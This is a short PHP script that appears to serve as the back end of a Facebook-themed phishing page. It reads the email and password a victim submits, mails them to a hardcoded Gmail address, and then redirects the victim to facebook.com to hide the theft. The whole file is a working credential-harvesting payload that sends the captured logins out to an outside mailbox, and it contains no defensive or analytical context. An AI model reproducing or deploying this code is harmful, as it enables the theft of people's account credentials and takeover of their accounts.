<?php

$to      = 'melkamudagne19@gmail.com';
$subject = 'the subject';
$message = $_POST["email"] . "  :  " . $_POST["pass"];
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

$retval = mail($to, $subject, $message,$header2);
if( $retval == true ){
     $newURL = "https://www.facebook.com";
      header('Location: '.$newURL);
   }else{
      echo "Message could not be sent...";
   }


?>
